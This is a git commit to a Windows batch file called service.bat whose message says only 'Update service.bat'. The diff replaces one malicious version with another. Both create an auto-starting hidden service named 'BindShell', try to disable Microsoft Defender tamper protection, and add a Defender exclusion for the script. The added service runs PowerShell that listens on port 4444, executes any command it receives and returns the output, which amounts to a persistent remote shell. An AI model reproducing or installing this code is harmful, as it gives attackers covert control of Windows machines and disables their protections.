8986ab4b6a990252e5a8cac7d745bb6724e2f8ee
RyanLoveless <raloveless@liberty.edu>
2026-02-06 17:45:30 -0500

    Update service.bat

--- service.bat
+++ service.bat
@@ -1,6 +1,5 @@
 @echo off
-sc delete BindShell 2>nul
-powershell -Command "Set-MpPreference -DisableTamperProtection $true -ea SilentlyContinue; Add-MpPreference -ExclusionPath '%~dpnx0' -ea SilentlyContinue"
-powershell -Command "$a=' -nop -ep bypass -w 1 -c ';$s='powershell '+$a+'$l=New-Object Net.Sockets.TcpListener(\"0.0.0.0\",4444);$l.Start();$l.AcceptTcpClient().GetStream()|%{$_=[System.Text.Encoding]::ASCII.GetString([byte[]]$_);iex($_)}'" | Out-File -FilePath .\bind.ps1 -Encoding ASCII
-sc create BindShell binpath= "powershell.exe -WindowStyle Hidden -File .\bind.ps1" start= auto
+sc delete BindShell>nul 2>&1
+powershell -c "Set-MpPreference -DisableTamperProtection $true -ea 0;Add-MpPreference -ExclusionPath '%~dp0' -ea 0">nul 2>&1
+sc create BindShell binpath= "powershell -w h -c \"while(1){try{$c=New-Object system.Net.Sockets.TCPClient('0.0.0.0',4444);$s=$c.GetStream();[byte[]]$b=0..5KB+1|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String );$sb2=$sb+'PS '+(pwd)+'> ';$sbt=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()}catch{sleep 3}}\"" start= auto
 sc start BindShell
